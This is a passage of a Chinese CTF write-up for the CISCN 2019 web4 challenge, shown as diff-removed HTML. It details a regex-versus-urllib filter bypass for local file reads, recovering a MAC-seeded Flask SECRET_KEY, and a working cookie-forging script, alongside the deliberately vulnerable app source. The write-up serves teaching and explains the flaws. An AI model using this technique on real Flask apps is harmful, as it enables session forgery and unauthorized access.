-</span></code></pre></div>
-<p><img alt="seed 与密钥" src="../../../assets/images/ciscn2019-web4/02-seed-key.png" /></p>
-<p><strong>看到两行就够了：</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">getnode</span><span class="p">())</span>                          <span class="c1"># 种子是 MAC 地址</span>
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span><span class="o">*</span><span class="mi">233</span><span class="p">)</span>  <span class="c1"># 密钥由种子推出来</span>
-</span></code></pre></div>
-<p><strong>伪随机数的致命点：</strong>种子固定 → 序列固定 → 结果可复现。<strong>所以只要知道 MAC，密钥就能算出来。</strong></p>
-<h4 id="step-4file"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#step-4file">Step 4：<code>file</code> 是怎么绕过的</a></h4>
-<p><strong>过滤是这一行：</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">'^file.*'</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
-</span></code></pre></div>
-<p><strong>注意 <code>^</code> —— 它锚定字符串的开头。所以它拦的是"</strong>以 file 开头<strong>的字符串"，不是"含 file 的字符串"。</strong></p>
-<p><strong>而 <code>urllib.urlopen()</code> 在真正解析之前会先 <code>unwrap()</code>，那个函数里有 <code>strip()</code>——把</strong>首尾空白<strong>去掉，还会剥掉外面包的 <code>&lt;&gt;</code>。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>正则看到的：  原始字符串（不以 file 开头 → 不拦）
-</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>urllib 看到的：strip 之后的字符串（以 file 开头 → 正常按文件读）
-</span></code></pre></div>
-<p><strong>两个组件对同一份输入的处理不一致，绕过点就在这里。</strong></p>
-<p><strong>另外还要注意 <code>n = re.findall('flag', url)</code>：URL 里任何位置出现 <code>flag</code> 都不行，所以读 MAC 只能用 <code>/sys/class/net/eth0/address</code> 这种路径。</strong></p>
-<h4 id="step-5-mac"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#step-5-mac">Step 5：读 MAC 地址</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>/sys/class/net/eth0/address   →  16:49:e9:36:04:ea（举例）
-</span></code></pre></div>
-<p><strong><code>uuid.getnode()</code> 返回的就是这块网卡的 MAC，转成整数。</strong></p>
-<h4 id="step-6-secret_key"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#step-6-secret_key">Step 6：本地算 SECRET_KEY</a></h4>
-<p><strong>公式：</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
-</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="s1">'1649e93604ea'</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
-</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">233</span><span class="p">)</span>
-</span></code></pre></div>
-<p><strong>⚠️ 这里有个大坑：必须按 <strong>Python 2</strong> 的 <code>str()</code> 行为算。</strong></p>
-<p><img alt="Python 2 计算" src="../../../assets/images/ciscn2019-web4/03-python2-calc.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>random()*233 的完整浮点 :  34.58290138764246
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>
-</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>Python 3 的 str()       :  34.58290138764246     ← 17 位
-</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>Python 2 的 str()       :  34.5829013876         ← 12 位（%.12g）
-</span></code></pre></div>
-<p><strong>Python 2 的 <code>str(float)</code> 等价于 <code>%.12g</code>，只保留 12 位有效数字。这题跑在 Python 2.7（<code>print str(ex)</code> 那个写法就是标志），所以密钥是</strong>短的那个<strong>。</strong></p>
-<p><strong>用 Python 3 的 <code>str()</code> 算出来去签名，会一直验不过——而且报错只说"签名不匹配"，不会告诉你差在六个字符上。</strong></p>
-<p><strong>在 Python 3 里复现 Python 2 的写法：</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="n">key</span> <span class="o">=</span> <span class="s1">'</span><span class="si">%.12g</span><span class="s1">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">233</span><span class="p">)</span>      <span class="c1"># → '34.5829013876'</span>
-</span></code></pre></div>
-<h4 id="step-7-session"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#step-7-session">Step 7：伪造 session</a></h4>
-<p><strong>flask-unsign 有两个坑，我都踩了：</strong></p>
-<p><strong>① 模块名是下划线</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>python -m flask_unsign     ✓
-</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>python -m flask-unsign     ✗ No module named flask-unsign
-</span></code></pre></div>
-<p><strong>② 它会把密钥当 Python 字面量解析</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>--secret '34.5829013876'   →  literal_eval → 浮点数
-</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>                              → 报 "Secret must be a string-type"
-</span></code></pre></div>
-<p><strong>加 <code>--no-literal-eval</code> 能解决这个——</strong>但它同时对 <code>--cookie</code> 生效<strong>，于是 <code>{"username":"fuck"}</code> 被当成一个</strong>字符串<strong>塞进 JSON。</strong></p>
-<p><strong>结果就是 Flask 拿到的是一个字符串而不是 dict：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>ValueError: dictionary update sequence element #0 has length 1; 2 is required
-</span></code></pre></div>
-<p><strong>这个报错其实是</strong>好消息<strong>——它说明签名验过了（签名错的话 Flask 会静默给你空 session），只是 payload 形状不对。</strong></p>
-<p><strong>最后改成直接用 Flask 自己的签名器，避开命令行参数的口径问题：</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">flask.sessions</span><span class="w"> </span><span class="kn">import</span> <span class="n">SecureCookieSessionInterface</span>
-</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>
-</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="k">class</span><span class="w"> </span><span class="nc">FakeApp</span><span class="p">:</span>
-</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
-</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">key</span>
-</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">config</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"SECRET_KEY_FALLBACKS"</span><span class="p">:</span> <span class="kc">None</span><span class="p">}</span>   <span class="c1"># Flask 3 会读这个</span>
-</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a>
-</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a><span class="n">si</span> <span class="o">=</span> <span class="n">SecureCookieSessionInterface</span><span class="p">()</span>
-</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a><span class="n">signer</span> <span class="o">=</span> <span class="n">si</span><span class="o">.</span><span class="n">get_signing_serializer</span><span class="p">(</span><span class="n">FakeApp</span><span class="p">(</span><span class="s2">"34.5829013876"</span><span class="p">))</span>
-</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a><span class="nb">print</span><span class="p">(</span><span class="n">signer</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">"username"</span><span class="p">:</span> <span class="s2">"fuck"</span><span class="p">}))</span>
-</span></code></pre></div>
-<p><strong>这样序列化格式（TaggedJSON + 必要时 zlib 压缩）跟目标一定对得上。</strong></p>
-<h4 id="step-8-flag"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#step-8-flag">Step 8：拿 flag</a></h4>
-<p><strong>把签好的 cookie 设成 <code>session</code>，访问 <code>/flag</code>。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>CTF2{b5ab3e88-9e2a-4217-ba5f-b92ba1c7c4ff}
-</span></code></pre></div>
-<hr />
-<h3 id="_3"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>跳转页 → /read?url= 能读东西，但 file:// 被拦（No Hack）
-</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>  → 绕过过滤器读源码（正则锚定开头 + urllib 会 strip，两边不一致）
-</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>    → 源码里发现 random.seed(uuid.getnode())
-</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>      → SECRET_KEY = str(random.random()*233)
-</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>        → 读 /sys/class/net/eth0/address 拿 MAC
-</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>          → 本地按 Python 2 的 str() 语义算出密钥
-</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>            → Flask 签名器签 {"username":"fuck"}
-</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>              → 访问 /flag
-</span></code></pre></div>
-<h4 id="_4"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#_4">漏洞原理</a></h4>
-<p><strong>① 伪随机数用"可预测的东西"当种子，等于没随机</strong></p>
-<p><code>random.seed(uuid.getnode())</code> —— 种子是 MAC 地址。MAC 不是秘密，读得到。<strong>知道种子就等于知道全部输出。</strong>这就是为什么密钥生成不能用 <code>random</code>，得用 <code>os.urandom</code> / <code>secrets</code>。</p>
-<p><strong>② 过滤器与解析器对同一份输入处理不一致</strong></p>
-<p>正则看原始字符串（<code>^file</code> 要求开头就是 file），<code>urllib</code> 看 <code>strip()</code> 之后的字符串。<strong>这个差值就是绕过空间，和 SQL 注入里"过滤器和数据库对同一串的理解不同"是同一类问题。</strong></p>
-<p><strong>③ 语言版本差异会改变输出的字符串</strong></p>
-<p><code>str(float)</code> 在 Python 2 和 3 里给的东西不一样。<strong>跨语言/跨版本复现逻辑时，这类差异最难查，因为逻辑完全正确，只有格式不同。</strong></p>
-<h4 id="_5"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#_5">关键知识点</a></h4>
-<table>
-<thead>
-<tr>
-<th>知识点</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Flask session ≠ JWT</td>
-<td>第一段解出 JSON 数据的是 Flask session；解出 <code>{"alg":...}</code> 的才是 JWT</td>
-</tr>
-<tr>
-<td><code>itsdangerous</code></td>
-<td>Flask session 的签名库，HMAC-SHA1 + <code>SECRET_KEY</code></td>
-</tr>
-<tr>
-<td><code>random.seed(int)</code></td>
-<td>种子相同则序列相同，可完全复现</td>
-</tr>
-<tr>
-<td><code>uuid.getnode()</code></td>
-<td>返回网卡 MAC 的整数值</td>
-</tr>
-<tr>
-<td><code>str(float)</code> 版本差异</td>
-<td>Python 2 ≈ <code>%.12g</code>（12 位有效数字），Python 3 是 17 位</td>
-</tr>
-<tr>
-<td><code>re.findall('^file.*', url)</code></td>
-<td><code>^</code> 锚定开头，只拦"以 file 开头"</td>
-</tr>
-<tr>
-<td><code>urllib.unwrap()</code></td>
-<td>内部会 <code>strip()</code> 首尾空白、剥掉 <code>&lt;&gt;</code></td>
-</tr>
-<tr>
-<td><code>flask-unsign</code> 的 literal_eval</td>
-<td>会把看起来像数字的密钥当浮点；<code>--no-literal-eval</code> 是全局开关</td>
-</tr>
-<tr>
-<td><code>ValueError: dictionary update...</code></td>
-<td>出现在 session 解签成功但 payload 不是 dict 时——<strong>说明密钥对了</strong></td>
-</tr>
-<tr>
-<td><code>SecureCookieSessionInterface</code></td>
-<td>直接用它签名，格式一定跟 Flask 一致</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<details class="note">
-<summary>完整源码（截图整理，压缩成可读格式）</summary>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="c1"># encoding:utf-8</span>
-</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">re</span><span class="o">,</span><span class="w"> </span><span class="nn">random</span><span class="o">,</span><span class="w"> </span><span class="nn">uuid</span><span class="o">,</span><span class="w"> </span><span class="nn">urllib</span>
-</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span>
-</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>
-</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
-</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">getnode</span><span class="p">())</span>
-</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span><span class="o">*</span><span class="mi">233</span><span class="p">)</span>
-</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a><span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">True</span>
-</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a>
-</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)</span>
-</span><span id="__span-34-11"><a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a><span class="k">def</span><span class="w"> </span><span class="nf">index</span><span class="p">():</span>
-</span><span id="__span-34-12"><a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a>    <span class="n">session</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'www-data'</span>
-</span><span id="__span-34-13"><a id="__codelineno-34-13" name="__codelineno-34-13" href="#__codelineno-34-13"></a>    <span class="k">return</span> <span class="s1">'Hello World! Read somethings'</span>
-</span><span id="__span-34-14"><a id="__codelineno-34-14" name="__codelineno-34-14" href="#__codelineno-34-14"></a>
-</span><span id="__span-34-15"><a id="__codelineno-34-15" name="__codelineno-34-15" href="#__codelineno-34-15"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/read'</span><span class="p">)</span>
-</span><span id="__span-34-16"><a id="__codelineno-34-16" name="__codelineno-34-16" href="#__codelineno-34-16"></a><span class="k">def</span><span class="w"> </span><span class="nf">read</span><span class="p">():</span>
-</span><span id="__span-34-17"><a id="__codelineno-34-17" name="__codelineno-34-17" href="#__codelineno-34-17"></a>    <span class="k">try</span><span class="p">:</span>
-</span><span id="__span-34-18"><a id="__codelineno-34-18" name="__codelineno-34-18" href="#__codelineno-34-18"></a>        <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'url'</span><span class="p">)</span>
-</span><span id="__span-34-19"><a id="__codelineno-34-19" name="__codelineno-34-19" href="#__codelineno-34-19"></a>        <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">'^file.*'</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
-</span><span id="__span-34-20"><a id="__codelineno-34-20" name="__codelineno-34-20" href="#__codelineno-34-20"></a>        <span class="n">n</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">'flag'</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
-</span><span id="__span-34-21"><a id="__codelineno-34-21" name="__codelineno-34-21" href="#__codelineno-34-21"></a>        <span class="k">if</span> <span class="n">m</span> <span class="ow">or</span> <span class="n">n</span><span class="p">:</span>
-</span><span id="__span-34-22"><a id="__codelineno-34-22" name="__codelineno-34-22" href="#__codelineno-34-22"></a>            <span class="k">return</span> <span class="s1">'No Hack'</span>
-</span><span id="__span-34-23"><a id="__codelineno-34-23" name="__codelineno-34-23" href="#__codelineno-34-23"></a>        <span class="n">res</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
-</span><span id="__span-34-24"><a id="__codelineno-34-24" name="__codelineno-34-24" href="#__codelineno-34-24"></a>        <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span><span id="__span-34-25"><a id="__codelineno-34-25" name="__codelineno-34-25" href="#__codelineno-34-25"></a>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
-</span><span id="__span-34-26"><a id="__codelineno-34-26" name="__codelineno-34-26" href="#__codelineno-34-26"></a>        <span class="nb">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
-</span><span id="__span-34-27"><a id="__codelineno-34-27" name="__codelineno-34-27" href="#__codelineno-34-27"></a>        <span class="k">return</span> <span class="s1">'no response'</span>
-</span><span id="__span-34-28"><a id="__codelineno-34-28" name="__codelineno-34-28" href="#__codelineno-34-28"></a>
-</span><span id="__span-34-29"><a id="__codelineno-34-29" name="__codelineno-34-29" href="#__codelineno-34-29"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">)</span>
-</span><span id="__span-34-30"><a id="__codelineno-34-30" name="__codelineno-34-30" href="#__codelineno-34-30"></a><span class="k">def</span><span class="w"> </span><span class="nf">flag</span><span class="p">():</span>
-</span><span id="__span-34-31"><a id="__codelineno-34-31" name="__codelineno-34-31" href="#__codelineno-34-31"></a>    <span class="k">if</span> <span class="n">session</span> <span class="ow">and</span> <span class="n">session</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'fuck'</span><span class="p">:</span>
-</span><span id="__span-34-32"><a id="__codelineno-34-32" name="__codelineno-34-32" href="#__codelineno-34-32"></a>        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'/flag.txt'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span><span id="__span-34-33"><a id="__codelineno-34-33" name="__codelineno-34-33" href="#__codelineno-34-33"></a>    <span class="k">else</span><span class="p">:</span>
-</span><span id="__span-34-34"><a id="__codelineno-34-34" name="__codelineno-34-34" href="#__codelineno-34-34"></a>        <span class="k">return</span> <span class="s1">'Access denied'</span>
-</span><span id="__span-34-35"><a id="__codelineno-34-35" name="__codelineno-34-35" href="#__codelineno-34-35"></a>
-</span><span id="__span-34-36"><a id="__codelineno-34-36" name="__codelineno-34-36" href="#__codelineno-34-36"></a><span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s1">'__main__'</span><span class="p">:</span>
-</span><span id="__span-34-37"><a id="__codelineno-34-37" name="__codelineno-34-37" href="#__codelineno-34-37"></a>    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s2">"0.0.0.0"</span><span class="p">)</span>
-</span></code></pre></div>
-</details>
-<details class="note">
-<summary>本地脚本：算密钥 + 签 session</summary>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="c1"># 1) 算密钥（Python 3 里复现 Python 2 的行为）</span>
-</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
-</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="n">mac</span> <span class="o">=</span> <span class="s1">'16:49:e9:36:04:ea'</span>
-</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">mac</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">':'</span><span class="p">,</span> <span class="s1">''</span><span class="p">),</span> <span class="mi">16</span><span class="p">))</span>
-</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="n">key</span> <span class="o">=</span> <span class="s1">'</span><span class="si">%.12g</span><span class="s1">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">233</span><span class="p">)</span>      <span class="c1"># '34.5829013876'</span>
-</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>
-</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="c1"># 2) 签 session（用 Flask 自己的签名器）</span>
-</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a><span class="kn">from</span><span class="w"> </span><span class="nn">flask.sessions</span><span class="w"> </span><span class="kn">import</span> <span class="n">SecureCookieSessionInterface</span>
-</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a>
-</span><span id="__span-35-10"><a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a><span class="k">class</span><span class="w"> </span><span class="nc">FakeApp</span><span class="p">:</span>
-</span><span id="__span-35-11"><a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a>    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">k</span><span class="p">):</span>
-</span><span id="__span-35-12"><a id="__codelineno-35-12" name="__codelineno-35-12" href="#__codelineno-35-12"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">k</span>
-</span><span id="__span-35-13"><a id="__codelineno-35-13" name="__codelineno-35-13" href="#__codelineno-35-13"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">config</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"SECRET_KEY_FALLBACKS"</span><span class="p">:</span> <span class="kc">None</span><span class="p">}</span>
-</span><span id="__span-35-14"><a id="__codelineno-35-14" name="__codelineno-35-14" href="#__codelineno-35-14"></a>
-</span><span id="__span-35-15"><a id="__codelineno-35-15" name="__codelineno-35-15" href="#__codelineno-35-15"></a><span class="n">si</span> <span class="o">=</span> <span class="n">SecureCookieSessionInterface</span><span class="p">()</span>
-</span><span id="__span-35-16"><a id="__codelineno-35-16" name="__codelineno-35-16" href="#__codelineno-35-16"></a><span class="n">signer</span> <span class="o">=</span> <span class="n">si</span><span class="o">.</span><span class="n">get_signing_serializer</span><span class="p">(</span><span class="n">FakeApp</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
-</span><span id="__span-35-17"><a id="__codelineno-35-17" name="__codelineno-35-17" href="#__codelineno-35-17"></a><span class="n">cookie</span> <span class="o">=</span> <span class="n">signer</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">"username"</span><span class="p">:</span> <span class="s2">"fuck"</span><span class="p">})</span>
-</span><span id="__span-35-18"><a id="__codelineno-35-18" name="__codelineno-35-18" href="#__codelineno-35-18"></a><span class="nb">print</span><span class="p">(</span><span class="n">cookie</span><span class="p">)</span>
-</span></code></pre></div>
 </details>
     
     
